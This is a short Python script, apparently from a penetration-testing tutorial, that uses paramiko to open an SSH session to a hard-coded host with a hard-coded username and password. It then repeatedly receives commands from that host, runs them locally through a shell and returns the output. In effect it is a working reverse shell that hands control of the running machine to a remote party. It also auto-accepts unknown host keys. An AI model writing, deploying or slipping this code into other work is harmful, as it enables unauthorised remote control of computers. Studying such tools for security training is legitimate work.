# -*- coding:utf-8 -*-
# version : python3.5
# description : https://xiaogeng.top/python/57.html

# import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # 密钥验证
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    # 允许连接不在known_hosts文件上的主机
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024).decode())
        while True:
            # 得到执行的命令
            command = ssh_session.recv(1024).decode()
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return

ssh_command('192.168.230.129', 'justin', 'lovesthepython', 'ClientConnection')
